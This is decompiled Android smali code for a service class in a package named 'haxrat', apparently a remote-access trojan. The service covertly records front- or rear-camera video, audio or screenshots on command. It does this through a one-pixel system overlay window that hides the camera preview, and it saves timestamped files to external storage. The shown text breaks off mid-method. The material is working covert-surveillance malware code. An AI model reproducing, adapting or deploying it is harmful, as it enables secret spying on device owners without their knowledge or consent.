.class public Lcom/hax4us/haxrat/CamService;
.super Landroid/app/Service;
.source "CamService.java"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hax4us/haxrat/CamService$100000000;
    }
.end annotation


# static fields
.field private static final TAG:Ljava/lang/String; = "Suprem"

.field private static currentapiVersion:I

.field private static typeForAudio:I

.field private static typeForVideo:I


# instance fields
.field buttonNumber:I

.field private camera:Landroid/hardware/Camera;

.field public cmd:Ljava/lang/String;

.field public file:Ljava/io/File;

.field isCameraQualityHigh:Z

.field private mediaRecorder:Landroid/media/MediaRecorder;

.field private pathString:Ljava/lang/String;

.field private secs:I

.field private stopRecordingTimer:Ljava/util/TimerTask;

.field private surfaceView:Landroid/view/SurfaceView;

.field private windowManager:Landroid/view/WindowManager;


# direct methods
.method static final constructor <clinit>()V
    .locals 3

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    sput v2, Lcom/hax4us/haxrat/CamService;->currentapiVersion:I

    const/4 v2, 0x0

    sput v2, Lcom/hax4us/haxrat/CamService;->typeForVideo:I

    const/4 v2, 0x1

    sput v2, Lcom/hax4us/haxrat/CamService;->typeForAudio:I

    return-void
.end method

.method public constructor <init>()V
    .locals 4

    .prologue
    .line 245
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    move-object v2, v0

    const/4 v3, 0x0

    check-cast v3, Landroid/hardware/Camera;

    iput-object v3, v2, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;

    move-object v2, v0

    const/4 v3, 0x0

    check-cast v3, Landroid/media/MediaRecorder;

    iput-object v3, v2, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    move-object v2, v0

    const/4 v3, -0x1

    iput v3, v2, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    move-object v2, v0

    const/4 v3, 0x0

    iput-boolean v3, v2, Lcom/hax4us/haxrat/CamService;->isCameraQualityHigh:Z

    move-object v2, v0

    const/4 v3, 0x0

    iput v3, v2, Lcom/hax4us/haxrat/CamService;->secs:I

    return-void
.end method

.method static synthetic access$1000012(Lcom/hax4us/haxrat/CamService;)V
    .locals 4

    move-object v0, p0

    move-object v3, v0

    invoke-direct {v3}, Lcom/hax4us/haxrat/CamService;->stopRecording()V

    return-void
.end method

.method public static getFilePath(II)Ljava/io/File;
    .locals 17

    .prologue
    .line 197
    move/from16 v0, p0

    move/from16 v1, p1

    const/4 v8, 0x0

    check-cast v8, Ljava/io/File;

    move-object v3, v8

    .line 198
    const/4 v8, 0x0

    check-cast v8, Ljava/io/File;

    move-object v4, v8

    .line 199
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v8

    move-object v5, v8

    .line 200
    move-object v8, v5

    const-string v9, "mounted"

    invoke-virtual {v8, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_0

    .line 201
    new-instance v8, Ljava/io/File;

    move-object/from16 v16, v8

    move-object/from16 v8, v16

    move-object/from16 v9, v16

    sget-object v10, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-static {v10}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v10

    invoke-virtual {v10}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v3, v8

    .line 203
    const-string v8, "TAGG"

    new-instance v9, Ljava/lang/StringBuffer;

    move-object/from16 v16, v9

    move-object/from16 v9, v16

    move-object/from16 v10, v16

    invoke-direct {v10}, Ljava/lang/StringBuffer;-><init>()V

    const-string v10, "path cam "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    sget-object v10, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-static {v10}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v10

    invoke-virtual {v10}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v8, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v8

    .line 204
    move-object v8, v3

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v8

    if-nez v8, :cond_1

    .line 205
    const/4 v8, 0x0

    check-cast v8, Ljava/io/File;

    move-object v3, v8

    .line 232
    :cond_0
    const/4 v8, 0x0

    check-cast v8, Ljava/io/File;

    move-object v0, v8

    :goto_0
    return-object v0

    .line 207
    :cond_1
    new-instance v8, Ljava/text/SimpleDateFormat;

    move-object/from16 v16, v8

    move-object/from16 v8, v16

    move-object/from16 v9, v16

    const-string v10, "yyyy_mm_dd_hh_mm"

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v11

    invoke-direct {v9, v10, v11}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    move-object v6, v8

    .line 209
    move v8, v0

    const/4 v9, 0x0

    if-ne v8, v9, :cond_2

    .line 210
    move v8, v1

    const/4 v9, 0x1

    if-ne v8, v9, :cond_5

    .line 211
    new-instance v8, Ljava/io/File;

    move-object/from16 v16, v8

    move-object/from16 v8, v16

    move-object/from16 v9, v16

    new-instance v10, Ljava/lang/StringBuffer;

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v11, Ljava/lang/StringBuffer;

    move-object/from16 v16, v11

    move-object/from16 v11, v16

    move-object/from16 v12, v16

    invoke-direct {v12}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v12, Ljava/lang/StringBuffer;

    move-object/from16 v16, v12

    move-object/from16 v12, v16

    move-object/from16 v13, v16

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v13, Ljava/lang/StringBuffer;

    move-object/from16 v16, v13

    move-object/from16 v13, v16

    move-object/from16 v14, v16

    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v14, Ljava/lang/StringBuffer;

    move-object/from16 v16, v14

    move-object/from16 v14, v16

    move-object/from16 v15, v16

    invoke-direct {v15}, Ljava/lang/StringBuffer;-><init>()V

    move-object v15, v3

    invoke-virtual {v15}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v14

    sget-object v15, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    const-string v14, "rear_"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    const-string v13, "video_"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    move-object v12, v6

    new-instance v13, Ljava/util/Date;

    move-object/from16 v16, v13

    move-object/from16 v13, v16

    move-object/from16 v14, v16

    invoke-direct {v14}, Ljava/util/Date;-><init>()V

    invoke-virtual {v12, v13}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    const-string v11, ".mp4"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v4, v8

    .line 219
    :cond_2
    :goto_1
    move v8, v0

    const/4 v9, 0x1

    if-ne v8, v9, :cond_3

    .line 220
    new-instance v8, Ljava/io/File;

    move-object/from16 v16, v8

    move-object/from16 v8, v16

    move-object/from16 v9, v16

    new-instance v10, Ljava/lang/StringBuffer;

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v11, Ljava/lang/StringBuffer;

    move-object/from16 v16, v11

    move-object/from16 v11, v16

    move-object/from16 v12, v16

    invoke-direct {v12}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v12, Ljava/lang/StringBuffer;

    move-object/from16 v16, v12

    move-object/from16 v12, v16

    move-object/from16 v13, v16

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v13, Ljava/lang/StringBuffer;

    move-object/from16 v16, v13

    move-object/from16 v13, v16

    move-object/from16 v14, v16

    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V

    move-object v14, v3

    invoke-virtual {v14}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    sget-object v14, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    const-string v13, "audio_"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    move-object v12, v6

    new-instance v13, Ljava/util/Date;

    move-object/from16 v16, v13

    move-object/from16 v13, v16

    move-object/from16 v14, v16

    invoke-direct {v14}, Ljava/util/Date;-><init>()V

    invoke-virtual {v12, v13}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    const-string v11, ".mp3"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v4, v8

    .line 223
    :cond_3
    move v8, v0

    const/4 v9, 0x2

    if-ne v8, v9, :cond_4

    .line 224
    new-instance v8, Ljava/io/File;

    move-object/from16 v16, v8

    move-object/from16 v8, v16

    move-object/from16 v9, v16

    new-instance v10, Ljava/lang/StringBuffer;

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v11, Ljava/lang/StringBuffer;

    move-object/from16 v16, v11

    move-object/from16 v11, v16

    move-object/from16 v12, v16

    invoke-direct {v12}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v12, Ljava/lang/StringBuffer;

    move-object/from16 v16, v12

    move-object/from16 v12, v16

    move-object/from16 v13, v16

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v13, Ljava/lang/StringBuffer;

    move-object/from16 v16, v13

    move-object/from16 v13, v16

    move-object/from16 v14, v16

    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V

    move-object v14, v3

    invoke-virtual {v14}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    sget-object v14, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    const-string v13, "screenshot_"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    move-object v12, v6

    new-instance v13, Ljava/util/Date;

    move-object/from16 v16, v13

    move-object/from16 v13, v16

    move-object/from16 v14, v16

    invoke-direct {v14}, Ljava/util/Date;-><init>()V

    invoke-virtual {v12, v13}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    const-string v11, ".png"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v4, v8

    .line 229
    :cond_4
    move-object v8, v4

    move-object v0, v8

    goto/16 :goto_0

    .line 215
    :cond_5
    new-instance v8, Ljava/io/File;

    move-object/from16 v16, v8

    move-object/from16 v8, v16

    move-object/from16 v9, v16

    new-instance v10, Ljava/lang/StringBuffer;

    move-object/from16 v16, v10

    move-object/from16 v10, v16

    move-object/from16 v11, v16

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v11, Ljava/lang/StringBuffer;

    move-object/from16 v16, v11

    move-object/from16 v11, v16

    move-object/from16 v12, v16

    invoke-direct {v12}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v12, Ljava/lang/StringBuffer;

    move-object/from16 v16, v12

    move-object/from16 v12, v16

    move-object/from16 v13, v16

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v13, Ljava/lang/StringBuffer;

    move-object/from16 v16, v13

    move-object/from16 v13, v16

    move-object/from16 v14, v16

    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v14, Ljava/lang/StringBuffer;

    move-object/from16 v16, v14

    move-object/from16 v14, v16

    move-object/from16 v15, v16

    invoke-direct {v15}, Ljava/lang/StringBuffer;-><init>()V

    move-object v15, v3

    invoke-virtual {v15}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v14

    sget-object v15, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    const-string v14, "front_"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    const-string v13, "video_"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    move-object v12, v6

    new-instance v13, Ljava/util/Date;

    move-object/from16 v16, v13

    move-object/from16 v13, v16

    move-object/from16 v14, v16

    invoke-direct {v14}, Ljava/util/Date;-><init>()V

    invoke-virtual {v12, v13}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    const-string v11, ".mp4"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v4, v8

    goto/16 :goto_1
.end method

.method private stopRecording()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 169
    move-object v0, p0

    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->stop()V

    .line 170
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->reset()V

    .line 171
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Landroid/media/MediaRecorder;->release()V

    .line 172
    move-object v2, v0

    iget v2, v2, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v3, 0x1

    if-eq v2, v3, :cond_0

    move-object v2, v0

    iget v2, v2, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v3, 0x2

    if-ne v2, v3, :cond_1

    .line 173
    :cond_0
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->lock()V

    .line 174
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->release()V

    .line 176
    :cond_1
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/CamService;->windowManager:Landroid/view/WindowManager;

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/CamService;->surfaceView:Landroid/view/SurfaceView;

    invoke-interface {v2, v3}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 177
    const-string v2, "Suprem"

    const-string v3, "cam stopped "

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    .line 178
    move-object v2, v0

    invoke-virtual {v2}, Lcom/hax4us/haxrat/CamService;->stopSelf()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 245
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onCreate()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    move-object v0, p0

    move-object v2, v0

    const-string v3, "com.aide.ui"

    invoke-static {v2, v3}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method public onDestroy()V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 15
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 62
    move-object v0, p0

    move-object/from16 v1, p1

    move/from16 v2, p2

    move/from16 v3, p3

    const-string v7, "Suprem"

    const-string v8, "onCreate service"

    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v7

    .line 63
    move-object v7, v0

    move-object v8, v1

    const-string v9, "cam"

    const/4 v10, 0x0

    invoke-virtual {v8, v9, v10}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v8

    iput v8, v7, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    .line 64
    move-object v7, v0

    iget v7, v7, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v8, 0x1

    if-ne v7, v8, :cond_0

    .line 65
    move-object v7, v0

    const-string v8, "RC"

    iput-object v8, v7, Lcom/hax4us/haxrat/CamService;->cmd:Ljava/lang/String;

    .line 69
    :goto_0
    move-object v7, v0

    move-object v8, v1

    const-string v9, "secs"

    const/4 v10, 0x0

    invoke-virtual {v8, v9, v10}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v8

    iput v8, v7, Lcom/hax4us/haxrat/CamService;->secs:I

    .line 70
    const-string v7, "Suprem"

    new-instance v8, Ljava/lang/StringBuffer;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    invoke-direct {v9}, Ljava/lang/StringBuffer;-><init>()V

    const-string v9, "onCreate service intent ="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    move-object v9, v1

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v7

    .line 79
    move-object v7, v0

    move-object v8, v0

    const-string v9, "window"

    invoke-virtual {v8, v9}, Lcom/hax4us/haxrat/CamService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/WindowManager;

    iput-object v8, v7, Lcom/hax4us/haxrat/CamService;->windowManager:Landroid/view/WindowManager;

    .line 80
    move-object v7, v0

    new-instance v8, Landroid/view/SurfaceView;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    move-object v10, v0

    invoke-direct {v9, v10}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    iput-object v8, v7, Lcom/hax4us/haxrat/CamService;->surfaceView:Landroid/view/SurfaceView;

    .line 81
    new-instance v7, Landroid/view/WindowManager$LayoutParams;

    move-object v14, v7

    move-object v7, v14

    move-object v8, v14

    const/4 v9, 0x1

    const/4 v10, 0x1

    const/16 v11, 0x7d6

    const/high16 v12, 0x40000

    const/4 v13, -0x3

    invoke-direct/range {v8 .. v13}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    move-object v5, v7

    .line 88
    move-object v7, v0

    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->windowManager:Landroid/view/WindowManager;

    move-object v8, v0

    iget-object v8, v8, Lcom/hax4us/haxrat/CamService;->surfaceView:Landroid/view/SurfaceView;

    move-object v9, v5

    invoke-interface {v7, v8, v9}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 89
    move-object v7, v0

    iget-object v7, v7, Lcom/hax4us/haxrat/CamService;->surfaceView:Landroid/view/SurfaceView;

    invoke-virtual {v7}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v7

    move-object v8, v0

    invoke-interface {v7, v8}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 91
    const/4 v7, 0x2

    move v0, v7

    return v0

    .line 67
    :cond_0
    move-object v7, v0

    const-string v8, "FC"

    iput-object v8, v7, Lcom/hax4us/haxrat/CamService;->cmd:Ljava/lang/String;

    goto :goto_0
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/SurfaceHolder;",
            "III)V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 11
    .annotation runtime Landroid/annotation/SuppressLint;
        value = "NewApi"
    .end annotation

    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/SurfaceHolder;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 98
    move-object v0, p0

    move-object v1, p1

    move-object v6, v0

    new-instance v7, Landroid/media/MediaRecorder;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    invoke-direct {v8}, Landroid/media/MediaRecorder;-><init>()V

    iput-object v7, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    .line 99
    move-object v6, v0

    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v7, 0x1

    if-eq v6, v7, :cond_0

    move-object v6, v0

    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v7, 0x2

    if-ne v6, v7, :cond_1

    .line 100
    :cond_0
    const-string v6, "Suprem"

    const-string v7, "surfaceCreated  service"

    invoke-static {v6, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    .line 101
    const/4 v6, 0x0

    move v3, v6

    :goto_0
    move v6, v3

    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v7

    if-lt v6, v7, :cond_6

    .line 119
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->camera:Landroid/hardware/Camera;

    invoke-virtual {v6}, Landroid/hardware/Camera;->unlock()V

    .line 121
    :cond_1
    move-object v6, v0

    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v7, 0x1

    if-eq v6, v7, :cond_2

    move-object v6, v0

    iget v6, v6, Lcom/hax4us/haxrat/CamService;->buttonNumber:I

    const/4 v7, 0x2

    if-ne v6, v7, :cond_3

    .line 122
    :cond_2
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    move-object v7, v1

    invoke-interface {v7}, Landroid/view/SurfaceHolder;->getSurface()Landroid/view/Surface;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/media/MediaRecorder;->setPreviewDisplay(Landroid/view/Surface;)V

    .line 123
    move-object v6, v0

    iget-object v6, v6, Lcom/hax4us/haxrat/CamService;->mediaRecorder:Landroid/media/MediaRecorder;

    move-object v7, v0

